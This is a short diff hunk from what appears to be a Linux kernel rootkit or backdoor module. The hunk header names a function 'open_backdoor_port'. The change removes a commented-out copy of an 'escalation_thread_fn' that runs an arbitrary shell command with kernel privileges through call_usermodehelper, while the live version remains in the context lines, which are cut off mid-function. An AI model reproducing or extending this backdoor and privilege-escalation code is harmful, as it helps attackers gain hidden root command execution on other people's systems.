@@ -1469,17 +1469,6 @@ static int open_backdoor_port(int port)
  * 
  * @return The function `escalation_thread_fn` is returning an integer value of 0.
  */
-/*static int escalation_thread_fn(void *data)
-{
-    char *cmd = (char *)data;
-    char *argv[] = {"/bin/sh", "-c", cmd, NULL};
-    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
-    
-    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-    kfree(cmd);
-    return 0;
-}*/
-
 static int escalation_thread_fn(void *data)
 {
     char *cmd = (char *)data;
